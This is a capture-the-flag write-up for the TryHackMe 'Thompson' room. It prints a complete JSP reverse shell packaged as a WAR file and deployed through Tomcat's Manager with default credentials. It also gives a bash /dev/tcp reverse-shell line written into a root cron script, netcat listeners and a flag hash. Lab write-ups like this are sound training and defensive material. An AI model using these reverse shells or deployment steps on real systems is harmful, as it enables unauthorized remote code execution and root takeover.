
**Difficulty:** Easy  
**OS:** Linux (Ubuntu)  
**Techniques:** Apache Tomcat default credentials, WAR file deployment, cron job privilege escalation

---

## Summary

Thompson exposes an Apache Tomcat 8.5.5 instance with default credentials on the Manager interface. Access to the Manager allows deployment of a malicious WAR file for remote code execution as the `tomcat` service account. A world-writable cron script owned by `jack` and executed as root provides a trivial privilege escalation path.

---

## 1. Enumeration

### Nmap

```bash
sudo nmap -sC -sV -T4 <TARGET_IP>
```

**Results:**

| Port | Service | Version                    |
| ---- | ------- | -------------------------- |
| 22   | SSH     | OpenSSH 7.2p2              |
| 8009 | AJP13   | Apache JServ Protocol v1.3 |
| 8080 | HTTP    | Apache Tomcat 8.5.5        |

**Key observations:**

- Tomcat 8.5.5 is an older version
- AJP port 8009 is exposed to the network
- Port 8080 is the primary attack surface

---

## 2. Tomcat Manager — Default Credentials

### Check if Manager is accessible

```bash
curl -s http://<TARGET_IP>:8080/manager/html
```

A `401 Unauthorized` response confirms the endpoint exists.

### Try default credentials

Navigate to `http://<TARGET_IP>:8080/manager/html` in a browser and try:

```
tomcat:tomcat
tomcat:s3cret      ← this works
admin:admin
admin:password
```

> **Result:** `tomcat:s3cret` grants full access to the Tomcat Web Application Manager.

---

## 3. WAR File Deployment — RCE

### 3.1 Create the directory structure

```bash
mkdir -p ~/TryHackMeRooms/Thompson/shell/WEB-INF
cd ~/TryHackMeRooms/Thompson
```

### 3.2 Create the JSP reverse shell

```bash
cat > shell/shell.jsp << 'EOF'
<%@ page import="java.io.*,java.net.*" %>
<%
    String host = "<YOUR_TUN0_IP>";
    int port = 4444;
    String cmd = "/bin/bash";
    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s = new Socket(host, port);
    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
    while (!s.isClosed()) {
        while (pi.available() > 0) so.write(pi.read());
        while (pe.available() > 0) so.write(pe.read());
        while (si.available() > 0) po.write(si.read());
        so.flush(); po.flush();
        Thread.sleep(50);
        try { p.exitValue(); break; } catch (Exception e) {}
    }
    p.destroy(); s.close();
%>
EOF
```

> Replace `<YOUR_TUN0_IP>` with your VPN IP (`ip a show tun0`).

### 3.3 Create web.xml

```bash
cat > shell/WEB-INF/web.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
  <display-name>shell</display-name>
</web-app>
EOF
```

### 3.4 Package the WAR

```bash
cd shell && jar -cvf ../shell.war . && cd ..
```

> If `jar` is not installed: `sudo dnf install java-21-openjdk-devel -y`  
> Alternative using zip: `cd shell && zip -r ../shell.war . && cd ..`

### 3.5 Start a listener

Open a new terminal:

```bash
nc -lvnp 4444
```

### 3.6 Deploy the WAR via browser

1. Navigate to `http://<TARGET_IP>:8080/manager/html`
2. Scroll to **"WAR file to deploy"** at the bottom
3. Click **Browse**, select `shell.war`
4. Click **Deploy**

> The Manager GUI must be used for deployment because the `tomcat` account only has the `manager-gui` role, not `manager-script`. The text API (`/manager/text/deploy`) returns 403.

### 3.7 Trigger the shell

```bash
curl http://<TARGET_IP>:8080/shell/shell.jsp
```

**Shell received in listener as `tomcat`.**

---

## 4. User Flag

```bash
ls /home
# jack

cat /home/jack/user.txt
# 39400c90bc683a41a8935e4719f181bf
```

---

## 5. Privilege Escalation — World-Writable Cron Script

### Investigate jack's home directory

```bash
ls -la /home/jack
```

Notice:

```
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
-rw-r--r-- 1 root root   39 Mar  8 12:45 test.txt
```

- `id.sh` is **world-writable**
- `test.txt` is owned by root and recently modified — it's the output of `id.sh`

```bash
cat /home/jack/id.sh
# #!/bin/bash
# id > test.txt

cat /home/jack/test.txt
# uid=0(root) gid=0(root) groups=0(root)
```

**Root is executing `id.sh` via a cron job.**

### Overwrite id.sh with a reverse shell

```bash
echo '#!/bin/bash' > /home/jack/id.sh
echo 'bash -i >& /dev/tcp/<YOUR_TUN0_IP>/5555 0>&1' >> /home/jack/id.sh
```

Verify:

```bash
cat /home/jack/id.sh
# #!/bin/bash
# bash -i >& /dev/tcp/<YOUR_TUN0_IP>/5555 0>&1
```

### Start a second listener

```bash
nc -lvnp 5555
```

Wait up to 60 seconds for the cron job to fire.

**Root shell received.**

---

## 6. Root Flag

```bash
cat /root/root.txt
```

---

## 7. Attack Chain

```
Nmap scan
    └── Tomcat 8.5.5 on :8080 + AJP on :8009
            └── Default creds (tomcat:s3cret) → Manager GUI
                    └── WAR file upload → RCE as tomcat
                            └── /home/jack/id.sh world-writable
                                    └── Root cron executes id.sh → Root shell
```

---

## 8. Remediation

|Finding|Fix|
|---|---|
|Default Tomcat credentials|Change all default credentials; restrict Manager to localhost|
|Tomcat Manager exposed remotely|Restrict `/manager` to `127.0.0.1` in `context.xml`|
|AJP port exposed|Disable AJP connector if not needed, or bind to localhost only|
|World-writable cron script|Fix permissions: `chmod 700 /home/jack/id.sh`|
|Cron running scripts as root|Audit all root cron jobs; avoid running user-owned scripts as root|

---

_TryHackMe — Thompson | Completed: March 2026_